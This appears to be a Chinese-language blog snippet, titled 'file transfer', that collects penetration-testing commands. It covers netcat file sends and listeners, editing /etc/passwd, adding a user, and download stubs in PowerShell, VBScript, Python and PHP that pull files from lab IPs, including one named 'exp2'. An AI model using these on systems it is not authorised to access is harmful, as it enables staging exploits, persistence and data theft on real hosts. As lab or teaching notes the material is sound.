    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> 文件传输</span><br><span class="line">常用代码</span><br><span class="line">	</span><br><span class="line">开启 阿帕奇  service apache2 status</span><br><span class="line">wget http://site.com/1.rar -O 1.rar</span><br><span class="line">sudo vi /etc/passwd </span><br><span class="line">有限权    </span><br><span class="line">adduser tmp_3452</span><br><span class="line">apt install wput</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo rm /var/cache/apt/archives/lock  </span><br><span class="line">sudo rm /var/lib/dpkg/lock  </span><br><span class="line">解锁</span><br><span class="line"></span><br><span class="line">nc</span><br><span class="line">	</span><br><span class="line">第一种</span><br><span class="line">发送端</span><br><span class="line"> nc 192.168.6.15 12345 &lt; exp2</span><br><span class="line">接受端</span><br><span class="line">nc -v -l 12345 &gt; exp2  </span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">cat .txt | nc -lvvp 4444</span><br><span class="line">nc 192.168.72.138 4444 &gt; b.txt</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;http://192.168.72.136/a.txt&quot;,&quot;a.txt&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Set post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">post.Open &quot;GET&quot;,&quot;http://192.168.72.138/a.txt&quot;</span><br><span class="line">&apos;发送请求</span><br><span class="line">post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">&apos;等待3秒，等文件下载</span><br><span class="line">&apos;wscript.sleep 3000 </span><br><span class="line">aGet.Write(post.responseBody)&apos;写数据</span><br><span class="line">aGet.SaveToFile &quot;n.txt&quot;,2</span><br><span class="line"></span><br><span class="line">cscript test.vbs</span><br><span class="line"></span><br><span class="line">####python</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">import urllib2</span><br><span class="line">u = urllib2.urlopen(&apos;http://192.168.72.138/a.txt&apos;)</span><br><span class="line">localFile = open(&apos;d.txt&apos;, &apos;w&apos;)</span><br><span class="line">localFile.write(u.read())</span><br><span class="line">localFile.close()</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">#### php</span><br><span class="line">#!/usr/bin/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">        $data = @file(&quot;http://192.168.72.138/a.txt&quot;);</span><br><span class="line"></span><br><span class="line">        $lf = &quot;c.txt&quot;;</span><br><span class="line"></span><br><span class="line">        $fh = fopen($lf, &apos;w&apos;);</span><br><span class="line"></span><br><span class="line">        fwrite($fh, $data[0]);</span><br><span class="line"></span><br><span class="line">        fclose($fh);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
